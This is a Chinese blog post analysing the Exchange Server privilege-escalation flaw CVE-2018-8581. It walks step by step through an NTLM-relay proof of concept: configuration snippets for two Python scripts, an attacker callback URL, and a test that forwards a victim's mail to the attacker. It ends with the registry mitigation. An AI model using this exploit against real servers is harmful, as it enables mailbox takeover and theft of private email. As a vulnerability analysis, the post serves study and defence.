# EXCHANGE 上冒充任意用户--Exchange Server 权限提升漏洞(CVE-2018-8581)分析 - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/11047387.html`](https://www.cnblogs.com/backlion/p/11047387.html)

## 0x00 前言

这是我们 2018 年 Top 5 趣案系列中的第三个案例。这些漏洞都有一些因素使它们从今年发布的大约 1，400 个报告中脱颖而出。今天我们将分析一个 Exchange 漏洞，它允许任何经过身份验证的用户冒充 Exchange Server 上的其他用户。

在 ZDI 的 Dustin Childs 12 月的[文章](https://www.zerodayinitiative.com/blog/2018/12/11/the-december-2018-security-update-review) 中，他提到了一个 Exchange 漏洞，允许 Exchange 服务器上的任何用户冒充该 Exchange 服务器上的任何人。虽然这个漏洞可以用于一些内网的劫持，但这个漏洞更有可能被用于钓鱼活动、窃取数据或其他恶意软件操作。作为 2018 年 Top 5 趣案系列的一部分，本文深入研究了这个 SSRF(服务器端请求伪造)漏洞的细节，并展示了冒充过程是如何实现的。

## 0x01 漏洞分析

该漏洞是由 SSRF 漏洞和其他漏洞相结合造成的。Exchange 允许任何用户为推送订阅指定所需的 URL，服务器将尝试向这个 URL 发送通知。问题出在 Exchange 服务器使用[CredentialCache.DefaultCredentials](https://docs.microsoft.com/en-us/dotnet/api/system.net.credentialcache.defaultcredentials)进行连接：

![](img/332d3dad2c6d222eeddafebbe9a93a1f.png)

在 Exchange Web 服务中，CredentialCache.DefaultCredentials 在 NT AUTHORITYSYSTEM 上运行。这将导致 Exchange Server 向攻击者的服务器发送 NTLM 散列。Exchange 服务器还默认设置了以下注册表项：HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLsaDisableLoopbackCheck = 1

这允许我们使用这些 NTLM 散列来进行 HTTP 身份验证。例如，可以使用这些散列来访问 Exchange Web 服务(EWS)。由于它在 NT AUTHORITYSYSTEM 级别运行，攻击者可以获得 TokenSerializationRight 的“特权”会话，然后可以使用 SOAP 请求头来冒充任何用户。

下面是这样一个 SOAP 请求头的例子，它用 SID S-1-5-21-4187549019-2363330540-1546371449-500 冒充管理员。

![](img/4afaa0e2b6577664b7c479749fd54cad.png)

[](https://p0.ssl.qhimg.com/t011c75498707bf811a.png)

## 0x02 漏洞利用

为了演示，我们将使用几个 Python 脚本：

serverHTTP_relayNTLM.py– 通过入站连接获取 NTLM 散列并用于 EWS 身份验证

exch_EWS_pushSubscribe.py – 导致 PushSubscription EWS 调用 serverHTTP_relayNTLM.py

你可以在[这里](https://github.com/thezdi/PoC/tree/master/CVE-2018-8581)下载这些脚本。你还需要 python-NTLM 模块。

漏洞的第一步是获取我们要冒充的用户的 SID。一种可能的使用方法是这样的：

1.以授权用户身份登录 OWA。在这里，我们以“攻击者”身份登录：[](https://p5.ssl.qhimg.com/t01202417bfc6e782b2.png)

![](img/7ea690996517a9f079e169f24c6f6b02.png)

2.接下来，创建任意新文件夹。在这个例子中，我们使用了 temfold。点击 context 中“Permissions…”选项：[](https://p2.ssl.qhimg.com/t017a013feedf7ab3fc.png)

![](img/763faad98d46b4ece9f32ea59bb86164.png)

3.在这里，添加要冒充的人的电子邮件。我们的目标是受害者 victim@contoso.local：[](https://p2.ssl.qhimg.com/t0173e9216820cfcd87.png)

![](img/cc0ab015c52ca86b1840bfa6d6cec449.png)

4.现在我们需要按 F12 键并选择 Network 选项。然后在新文件夹中再次选择 context 中“Permissions…”选项。[](https://p0.ssl.qhimg.com/t016c5bbc73af8419b2.png)

![](img/d5dee18745d99edd18b59fa1b9c01aef.png)

5.我们需要检查第一个 service.svc?action=GetFolder 请求的响应。查看方法：

```
Body->ResponseMessages->Items->0->Folders->0->PermissionSet->Permissions->N->UserId->SID
```

在这个例子中，N 是 2(最新的)，但是你可以全部检查一遍以便找到正确的。PrimarySmtpAddress 应该是理想的受害者。如果响应不包含 PermissionSet 项，则需要检查另一个 service.svc?action=GetFolder 请求。[](https://p1.ssl.qhimg.com/t01d0bce3fc1d5735ec.png)

![](img/703cfa3ec979ed96dbbb5964956b29ba.png)

6.我们将在 serverHTTP_relayNTLM.py 中使用这个 SID 来冒充受害者。另外，我们还需要选择在攻击者控制的计算机上不太可能被阻止的 TCP 端口，这些端口将允许 Exchange Server 上的外部连接。例如，TCP 端口 8080 可能可用。现在，让我们用真实信息更改 serverHTTP_relayNTLM.py 中的下一行：[](https://p0.ssl.qhimg.com/t01e7b77ec69be2b585.png)

#Port for the HTTP server

#Should be the same as in EVIL_HTTPSERVER_URL in Exch_EWS_pushSubscribe.py

HTTPPORT = 8080

```
#You have to replace next values by valid ip/address, port and protocol ('http' or 'https') to EWS 
target_ip='exch2016.contoso.local' target_port = 443 PROTO='https' #PROTO='http'  #Path to EWS
URL = "/EWS/Exchange.asmx"  #SMTP addresses of attacker mailbox (we will receive all emails sent to victim) 
ATTACKER = "attacker@contoso.local" VICTIM_SID = "S-1-5-21-4187549019-2363330540-1546371449-2604" 
```

![](img/3427dc95a3e2f2de7814b72857726dbe.png)

*一旦脚本有了正确的变量，就可以启动了：*

*![](img/200996e5dce67bb17fe298c3426d9518.png)*

[](https://p0.ssl.qhimg.com/t017b7116cbf397a5b3.png)

7.下一步是在 Exch_EWS_PushSubscribe.py 脚本中设置适当的变量：[](https://p4.ssl.qhimg.com/t01d7983698dad57156.png)

```
#You have to replace next values by valid ip/address, port and protocol ('http' or 'https')
ip='exch2016.contoso.local' tcp_port = 443 #PROTO='http' PROTO='https' #Credentials of attacker
USER = 'attacker' DOMAIN = 'contoso.local' PASS = 'P@ssw0rd' URL = "/EWS/Exchange.asmx" #URL of our HTTP server that will use NTLM hashes for impersonation of victim 

EVIL_HTTPSERVER_URL = "http://192.168.50.173:8080/test"
```

![](img/81dc1f4c12c4ab1e359a2662bea5cfa2.png)

一旦完成，我们就可以执行以下脚本：

![](img/789a4b24447945553a109319dce40bab.png)

[](https://p5.ssl.qhimg.com/t01e57e1921c02b4f45.png)

8.最后一步。我们需要一些事件触发推送通知。如果可以等待一段时间，或者我们也可以执行一些操作，比如创建和发送新的电子邮件，或者删除我们的新文件

![](img/82f06a903a86688458f39db7ceccce41.png)

如果成功，我们应该接收从 Exchange 服务器到 serverHTTP_relayNTLM.py 的入站连接：[](https://p1.ssl.qhimg.com/t01d7fe2de8ab083720.png)

如果攻击成功，我们将在最后一个响应中看到 UpdateInboxRulesResponse ResponseClass=“Success”。这意味着入站规则已添加到受害者邮箱中，所有入站电子邮件都将转发给攻击者。

现在一切就绪，是时候测试了。我们需要从任意帐户向受害者发送电子邮件，但与我们新规则中的目的地不相同(在本例是 attacker@contoso.local)，因为如果源和目的地是相同的地址，则该规则不会转发电子邮件。让我们以管理员身份登录并向受害者发送一些“敏感”信息：

![](img/336ac62522777fcef8d3da5059f210f3.png)

[](https://p1.ssl.qhimg.com/t0175fa2c07f45c78e0.png)

检查攻击者的收件箱，我们看到消息成功转发：

![](img/f98105ea3746510c9feea6ebaeda6f0d.png)

[](https://p4.ssl.qhimg.com/t0138b03e3c3bcc04df.png)

正如我们所看到的，新的邮件被转发给攻击者。类似的结果可以通过其他 EWS API 实现，比如 AddDelegate 或将编辑权限分配给目标文件夹。

## 0x03 补丁

微软将该漏洞分配为 CVE-2018-8581，并在 11 月份发布时给出[缓解措施](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581)。实际上这个漏洞还没有修补程序。相反，Microsoft 强调应该删除注册表项。删除这个键可启用回送检查。回想上面的内容，Exchange 服务器默认设置了以下注册表项：

HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLsaDisableLoopbackCheck = 1

如果删除 HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLsaDisableLoopbackCheck 键，则漏洞不可以。若要删除注册表项，请在 CMD 窗口中输入以下命令：

[](https://p3.ssl.qhimg.com/t01f40b680305f67eee.png)

删除密钥后不需要重新启动或 Exchange Server。公告指出，将来 Exchange 的更新在默认情况下将不再启用注册表项。

## 0x04 总结

电子邮件已经成为我们商业生活的核心组成部分，Exchange Server 多年来一直是一个热门的目标。该漏洞允许冒充用户，通过以前报告的[漏洞](https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server)允许任意代码执行。这两种情况都表明，有时最大的安全风险来自内部。这些漏洞还展示了外部攻击者如何从单个入口点在整个企业中扩散。